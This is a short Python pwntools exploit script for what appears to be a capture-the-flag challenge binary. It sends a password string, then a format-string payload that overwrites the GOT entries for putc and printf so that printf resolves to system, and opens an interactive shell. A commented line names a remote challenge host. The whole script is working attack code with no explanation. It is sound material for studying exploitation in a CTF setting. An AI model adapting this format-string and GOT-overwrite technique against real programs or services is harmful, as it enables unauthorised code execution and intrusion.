from pwn import *

binary = './challenge/chal'

# context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('vault.ctf.prgy.in', 1337, ssl=True)

payload = fmtstr_payload(6, {
  e.got['putc']: 0x401448,
  e.got['printf']: e.symbols['system']
}, write_size='short')

r.recvuntil(b">>> ")
r.sendline(b"Lost_in_Light")

r.recvuntil(b">>> ")
r.sendline(payload)

r.interactive()
